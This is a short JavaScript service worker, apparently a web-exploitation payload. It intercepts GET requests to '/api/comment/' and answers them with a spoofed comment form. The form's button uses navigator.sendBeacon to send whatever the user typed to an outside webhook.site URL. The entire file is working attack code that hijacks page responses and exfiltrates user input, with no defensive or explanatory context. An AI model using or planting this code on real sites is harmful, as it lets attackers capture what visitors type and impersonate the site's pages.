self.addEventListener('fetch', (e) => {
    if (e.request.method == 'GET' && e.request.url.includes('/api/comment/')) {
        e.respondWith(
            new Response(`<html><body><textarea name="text"></textarea><button class='btn btn-primary mt-3 float-end' type='submit' onclick='navigator.sendBeacon("https://webhook.site/ae3fe73f-3566-4bbf-aa5e-437f4dcba4e1", document.querySelector("textarea").value)'>Comment</button></body></html>`, {
                headers: {
                    'content-type': 'text/html',
                },
            })
        );
    } else {
        return;
    }
});
